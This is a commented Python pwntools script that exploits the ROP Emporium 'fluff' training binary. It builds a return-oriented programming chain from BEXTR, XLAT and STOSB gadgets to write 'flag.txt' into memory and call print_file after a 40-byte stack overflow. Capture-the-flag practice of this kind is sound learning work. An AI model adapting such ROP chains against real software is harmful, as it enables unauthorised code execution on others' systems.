from pwn import context, ELF, packing, process

# special thanks to shero4 @ https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/fluff/exploit.py
# whom without I could not have understood how to exploit this binary

# first we need to retrieve the byte locations of 'flag.txt'
# objdump -sj .dynstr fluff  -> f,l,a,t
# objdump -h fluff
# objdump -sj .text fluff -> x
# objdump -sj .gnu.version_r -> g

# find instances of our required filename characters
# inside the challenge binary

filename = ['f','l','a','g','.','t','x','t']
filename_locations = []
for char in filename:
    char_as_bytes = str.encode(char)
    # use relative location because binary starts at 
    # 0x400000 and the function returns 0x3c4 which is really 0x4003c4 (important later)
    relative_location = hex(open("fluff", "rb").read().find(char_as_bytes))
    filename_locations.append(relative_location)
    # returns an array of the relative byte locations of the characters in our filename array

# create a list of the actual memory locations of our characters
actual_locations = []
for location in filename_locations:
    actual_location = int(location, 16) + 0x400000
    actual_locations.append(hex(actual_location))

# usefulGadgets (in order of usage):
# 1) BEXTR (and the 3 operations before it (the add 0x3ef2 complicates the logic below)) allows us to place the char location in EBX for use by XLAT
# 2) XLAT - allows us to store our flag locations in the AL register for STOS' use
# 3) STOS - writes the actual characters to a location specified by the address stored in RDI

# BEXTR - we will extract 0x4000 bits (specified by RCX) away from the actual location (not relative) of our char (stored in RDX)- 
#           taking care to subtract 0x3ef2 from the actual location to compensate for the add operation that occurs following pop rcx

# XLAT - critical to understanding the exploit. xlat uses what is in the last 8 bits of the RAX register (aka AL) 
#           as its table offset. since we are looping, the al/rax value will be the __previous__ letter's value. that means we have to subtract
#           the hex(ord(char)) from our calculation for when we set rbx in addition to the 0x3ef2 that we see in gdb.
#            for the same reason we need to account for the initial rax value set by the program.

###usefulGadgets

xlat = 0x400628
pop_rdx_pop_rcx_add_rcx_bextr = 0x40062a
stosb = 0x400639

# rop gadgets
pop_rdi_ret = 0x4006a3
bss_section_address = 0x601038
print_file = 0x400510

rop = b"\x41" * 40
for i in range(0,8):
    if i == 0:
        rax_table_index = 0xb   # breakpoint pwnme, 'n' until read call, rax holds 0xb
    else:
        # rax value serves as table index during xlat lookup
        rax_table_index = ord(filename[i-1])

    bss_write = [pop_rdx_pop_rcx_add_rcx_bextr, 0x4000, int(actual_locations[i], 16) - rax_table_index - 0x3ef2, xlat, pop_rdi_ret, \
        bss_section_address + i, stosb]
    rop += b"".join([packing.p64(r) for r in bss_write])

print_flag = [pop_rdi_ret, bss_section_address, print_file]
rop += b"".join([packing.p64(r) for r in print_flag])

elf = context.binary = ELF("fluff")
p = process(elf.path)
p.sendline(rop)
p.interactive()
